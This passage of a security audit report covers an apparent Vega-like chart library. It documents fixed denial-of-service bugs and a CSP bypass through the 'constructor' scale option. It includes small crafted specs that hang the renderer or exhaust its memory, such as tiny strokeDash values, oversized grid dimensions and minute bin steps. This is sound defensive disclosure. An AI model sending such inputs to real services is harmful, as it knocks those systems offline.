- **Scenario:** `values:[{grid:{width:0, height:1e12, values:[]}}]` + `{type:'heatmap', field:'grid'}` → never returns. Same with `{width:'a', height:1e12}` and `{width:4, x1:2, x2:2, y2:1e12}`. Unchanged with `limits:{maxTimeMs:500, maxRows:1000}`. Vega throws at once (`Cannot read properties of null (reading 'getContext')`, 12 ms).
- **Status: CONFIRMED-RUN** — `dos.mjs heatmapZeroWidth` (exit 124 at 20 s, with and without limits), `dos2.mjs heatmapNaNWidth '{"maxTimeMs":300}'`, `dos2.mjs heatmapX1eqX2` (both exit 124); Vega: `vegaperf.mjs heatmapZeroWidth`.
- **Direction:** validate the grid (finite non-negative integers, `x1 <= x2 <= width`, `values.length >= width*height`), bound `w` and `h` each, return an empty image when either is 0, tick per row.

#### C16 — High — A tiny `strokeDash` on a mark that `label` draws kills the process

- **Location:** `packages/core/src/raster-stroke.ts:75`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #193 (c93ceb3 04c0854 af50f2f). Fixed: a contour of more than a million dashes is stroked undashed (Skia's rule), and the dash walk ticks per piece; strokeDash [1e-7] / [1e-20] under label complete in ~20 ms under every limits form.
- **Area:** core / layout transforms, rasterizer
- **Lane ID / scripts:** `core-layout-1` — `core-layout/`

**A tiny `strokeDash` on a mark that `label` draws kills the process.**

- **Cause:** `while (len > remaining) { ...; len -= remaining; out.push(...) }` makes `length / dash` pieces. For a dash below the float spacing of `len` (`1000 - 1e-20 === 1000`) it never ends. `AlphaCanvas.setLineDash` (`raster.ts:146-149`) accepts any finite entry `>= 0`. There is no `meterTick` and no cap.
- **Scenario:** a rect mark with `stroke: 'black', strokeDash: [1e-7]` (or `[1e-20]`), plus a text mark `from: {data: 'base'}` with `transform: [{type: 'label', size: [200, 100]}]`. Defaults suffice, since `avoidBaseMark` is true; `avoidMarks` reaches it too.
- **Observed:** `timeout 40 node --max-old-space-size=1024 dos.mjs dash-small` and `dash-tiny`, both with `limits: {maxTimeMs: 200}`, end in `FATAL ERROR: ... JavaScript heap out of memory`, exit 134, after about 3.5 s. The control `dos.mjs dash-control` (`[2,2]`) is ok in 36 ms.
- **Expected:** at least an `AsterLimitError`. `docs/LIMITS.md:54-57` says the ceilings exist so a small spec cannot cause a fatal out-of-memory.
- **Status:** CONFIRMED-RUN.
- **Direction:** cap dash pieces per subpath, treat sub-pixel-fraction dashes as solid, guard against a step that does not advance, and add `meterTick`.

#### C17 — High — `isocontour` sizes its scan by the `width`/`height` a data row carries, not by `values.length`

- **Location:** `packages/core/src/contour.ts:179-192`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #193 (c93ceb3 04c0854). Fixed: contourPolygons bounds the declared grid (row buffers as cells, the scan thresholds x cells as work) and ticks per row, for isocontour data grids and contour sizes alike.
- **Area:** core / layout transforms, rasterizer
- **Lane ID / scripts:** `core-layout-2` — `core-layout/`
- **Lead's note:** The lead re-ran scenario B (100,000 × 100,000 declared, 4 values, `maxTimeMs: 200`): still running when killed at 15 s. Scenario A (4 GB RSS) was not re-run.

**`isocontour` sizes its scan by the `width`/`height` a data row carries, not by `values.length`.**

- **Cause:** `polygonsAt` allocates two `Uint8Array(columns + 2)` and loops `rows x columns` (`contour.ts:190-198`). `contourPolygons` only checks `>= 0`. `isocontourRows` passes `[Math.floor(grid.width), Math.floor(grid.height)]` straight from the row.
- **Doc claim that does not hold:** `docs/LIMITS.md:217` says "contour grid cells and thresholds ... checked before the output is allocated". That is true for the density path (`densityGrid` meters `n * m`), not for a grid given as data.
- **Scenario A** (`dos.mjs iso-lying-size-nolimits`): one row `{grid: {values: [1, 0], width: 2e9, height: 1}}`, `thresholds: [0.5]`, no limits. Result: "ok" after 31 194 ms, RSS 101 → 4 083 MB.
- **Scenario B** (`dos.mjs iso-lying-size`): `width: 1e5, height: 1e5`, 4 values, `limits: {maxTimeMs: 200}`. Still running when killed at 60 s.
- **Status:** CONFIRMED-RUN. Vega hangs on the same input.
- **Direction:** `meterRows(width * height, 'isocontour grid', 'cells')` inside `contourPolygons` so both callers are covered, plus a `meterTick` per row.

**Independent report of the same defect** (lane ID `core-xform-5`, scripts `core-xform/`, CONFIRMED (run); `isocontour` / `contour` trust grid dimensions from data or parameters):

- **Where:** `raster-transforms.ts:100` (`contourRun!(grid.values, thresholds, [Math.floor(grid.width), Math.floor(grid.height)], smooth)`, no check against `values.length`, no `cells` ceiling); `transform.ts:684-686,709` (`contour` with `values`: `size = t.size`).
- **Scenario:** `{grid:{width:40000,height:40000,values:[]}}` + isocontour → 13.0 s for one row; under `limits:{maxTimeMs:500,maxRows:1000}` 14.4 s and it **returns normally**. `400000²` does not finish in 25 s under the same limits. `{type:'contour', size:[30000,30000], values:[1,2,3], thresholds:[1.5]}` → 7.3 s.
- **Status: CONFIRMED-RUN** — `dos.mjs isoBigGrid`, `dos2.mjs isoHuge …` (exit 124), `dos2.mjs contourValuesSize`.
- **Direction:** `cells` ceiling / `maxRows` on `width*height` in both callers, require `values.length >= width*height`, tick inside the contour rows (`contour.ts`, another lane's file).

#### C18 — High — spec text reaches the `Function` constructor

- **Location:** `packages/core/src/scales.ts:103-107`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #196 (42b591c). Fixed: a scale option is applied only when it is the scale's own method (inherited names are never called, so no spec text reaches Function); csp-no-dynamic-code scans core/vl/react dist and renders the corpus under --disallow-code-generation-from-strings.
- **Area:** core / scales, time, format, colour (also categories 7)
- **Lane ID / scripts:** `core-scale-1` — `core-scale/`
- **Lead's note:** The compiled function is never called; the lane found no route to execution. High because a documented guarantee ("no `new Function`", CSP-safe) does not hold for a hostile spec.

`packages/core/src/scales.ts:103-107` (header `scales.ts:9`: "an option whose name is a method of the scale is called with its value").

```ts
for (const key of Object.keys(st)) {
  if (HANDLED.has(key)) continue
  if (key === 'padding' && padsDomain(scale.type)) continue
  if (typeof scale[key] === 'function') (scale[key] as (v: unknown) => unknown)(st[key])
}
```
A scale is a function object, so `scale[key]` also finds inherited members of `Function.prototype`. `readSettings` (`scales.ts:468-472`) copies every spec key except `name` and `__proto__`, so `constructor` survives and `scale.constructor(value)` is `Function(value)`.

- **Scenario:** `{"scales":[{"name":"s","type":"linear","domain":[0,1],"range":"width","constructor":"this is not ( javascript"}]}` → Aster logs `Unexpected identifier 'is'` (a SyntaxError from compiling the text) and builds no scale; vega builds it. `"constructor":"return 1"` compiles silently.
- **Under a code-generation ban** (`node --disallow-code-generation-from-strings`, what a CSP without `'unsafe-eval'` does): logs `EvalError: Code generation from strings disallowed for this context`, scale absent.
- **Expected:** `README.md:192` ("CSP-safe interpreter (no `new Function`)") and `docs/ARCHITECTURE.md:282` ("Nothing is compiled with `new Function` or `eval`") hold for any spec.
- **Impact, plainly:** the compiled function is never called. I found no inherited member that leads to execution (`call`/`apply`/`bind` only call the scale with no argument; `__defineGetter__` throws a logged TypeError). This is a documented guarantee that does not hold and a spec-triggered CSP violation, not code execution.
- **Status:** CONFIRMED-RUN — `probe-inherited-option.mjs`, `probe-function-ctor.mjs` (plain and with the flag).
- **Direction:** apply an option only when it is an own member (`Object.hasOwn(scale, key)`), or use a per-type allow-list. Add a negative test.

#### C19 — High — fatal OOM from a tiny spec with no limits

- **Location:** `packages/core/src/scales.ts:254`
- **Status:** CONFIRMED (run)
- **Resolution:** FIXED in #196 (47836c0 cb33297). Fixed: range() bounds the length it allocates and calendar ranges count their dates, both against the rows ceiling with or without limits (scale bins step 1e-7, utcSequence of seconds); scale-time-bounds runs each repro in a killable child.
- **Area:** core / scales, time, format, colour (also categories 7)
- **Lane ID / scripts:** `core-scale-2` — `core-scale/`

`packages/core/src/scales.ts:254` (`bins = sequence(start, stop + step / 2, step)`); `packages/core/src/arr.ts:49-51` (`range` only calls `boundedCount`, a no-op without a limits scope); `packages/core/src/time.ts:99-115` (`interval.range` is metered only under limits).

`docs/ARCHITECTURE.md:585` and `docs/LIMITS.md:60-75` say built-in ceilings hold without limits "for the inputs a tiny spec can use to exhaust the process". Two spec-driven counts here have none:

1. **Scale `bins: {step}`:** `{"scales":[{"name":"x","type":"linear","domain":[0,1000],"range":"width","bins":{"step":1e-7}}],"axes":[{"orient":"bottom","scale":"x"}]}` → `FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory`, exit 134. With `limits: {maxRows: 10000}` it is refused in 9 ms.
2. **`utcSequence` in an expression:** `{"signals":[{"name":"n","update":"length(utcSequence('seconds', datetime(2000,0,1), datetime(2030,0,1)))"}]}` → `FATAL ERROR: Ineffective mark-compacts near heap limit`, exit 134. With `limits: {maxItems: 50000}` it is refused in 33 ms.

- vega dies the same way on the `bins` spec; I did not run the `utcSequence` spec through vega (`oom-timesequence.mjs` is Aster-only). The finding is Aster's stated guarantee, and that the process dies rather than throws.
- **Status:** CONFIRMED-RUN — `hang-run.sh bins-step-tiny` (1 GB heap child), `oom-timesequence.mjs`.
- **Direction:** `ceiling('rows', …)` before `sequence` in `fitBins`; a ceiling in `interval.range` when no meter is active; list both in LIMITS.md.

- **Status:** CONFIRMED (run; re-run by lead)
